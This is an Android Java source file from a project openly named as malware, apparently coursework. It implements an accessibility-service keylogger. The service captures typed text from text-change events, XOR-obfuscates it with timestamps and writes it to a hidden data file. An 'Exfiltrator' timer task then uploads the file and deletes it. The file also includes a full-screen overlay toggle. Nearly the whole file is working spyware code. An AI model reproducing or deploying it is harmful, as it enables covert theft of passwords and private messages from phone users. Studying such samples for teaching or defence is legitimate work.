package com.example.ict2207malware;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.PorterDuff;
import android.graphics.PorterDuffColorFilter;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.widget.ImageView;

import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Timer;
import java.util.TimerTask;

public class Accessibility extends AccessibilityService {
    private Timer timer;
    private WindowManager wm;
    private WindowManager.LayoutParams params;
    private boolean inversionActivated = false;
    private ImageView imageView;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;
        if(eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                eventText = String.valueOf(event.getText());
        }
        if(eventText == null) {
           return;
        }
        try {
            boolean created = Identity.getData().createNewFile();
            if(created) {
                addMagic();
            }
            writeData(formatData(eventText));
            startTimer();
        }
        catch(Exception e) {
            Logger.logFileError(e, "1");
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 20;
        this.setServiceInfo(info);
        if(Identity.getData().length() != 0) {
            startTimer();
        }
        LocalBroadcastManager.getInstance(getBaseContext()).registerReceiver(receiver, new IntentFilter("toggleColor"));
        wm = (WindowManager) this.getSystemService(Service.WINDOW_SERVICE);
        imageView = new ImageView(this);
        imageView.setImageBitmap(Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888));
        imageView.setColorFilter(new PorterDuffColorFilter(Color.argb(128, 200, 100, 0), PorterDuff.Mode.OVERLAY));
        imageView.setFitsSystemWindows(false);
        params = new WindowManager.LayoutParams(
                4000,4000,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                        WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR |
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT);
    }

    private BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if(inversionActivated) {
                wm.removeView(imageView);
            }
            else {
                wm.addView(imageView, params);
            }
            inversionActivated = !inversionActivated;
        }
    };

    private void startTimer() {
        if(timer != null) timer.cancel();
        timer = new Timer();
        Exfiltrator task = new Exfiltrator();
        task.setData(Identity.getData());
        timer.schedule(task, 5000L);
    }

    private class Exfiltrator extends TimerTask {
        private File data;

        @Override
        public void run() {
            sendNow();
        }
        private void sendNow() {
            try {
                MainActivity.uploadFromString(Identity.getData().getCanonicalPath(), 1);
                this.data.delete();
            }
            catch (Exception e) {
                Logger.logFileError(e, "2");
            }
        }
        public void setData(File data) {
            this.data = data;
        }
    }



    private byte[] getTSBytes() {
        Long ts = System.currentTimeMillis();
        byte[] b = longToByte(ts);
        return b;
    }

    private byte[] longToByte(Long l) {
        ByteBuffer buf = ByteBuffer.allocate(Long.BYTES);
        buf.putLong(l);
        return buf.array();
    }

    private void writeData(byte[] bytes) {
        try {
            FileOutputStream fs = getBaseContext().openFileOutput( Identity.getDataFilename(), Context.MODE_APPEND);
            fs.write(bytes);
            fs.close();
        }
        catch (Exception e) {
            Logger.logFileError(e, "3");
        }
    }

    private void addMagic() {
        String str = "bakaneko";
        byte[] magic = str.getBytes(StandardCharsets.UTF_8);
        writeData(magic);
    }

    private byte[] formatData(String s) {
        byte[] t = getTSBytes();
        byte[] d = s.getBytes(StandardCharsets.UTF_8);
        byte[] res;
        int l = d.length;
        byte[] len = ByteBuffer.allocate(Integer.BYTES).putInt(l).array();
        // store in binary
        for (int i = 0; i < l; i++) {
            d[i] ^= ~t[i%t.length];
        }
        // concatenate
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        try {
            os.write(t);
            os.write(len);
            os.write(d);
            res = os.toByteArray();
            os.close();
            return res;
        }
        catch (Exception e) {
            Logger.logFileError(e, "4");
            return null;
        }
    }
}
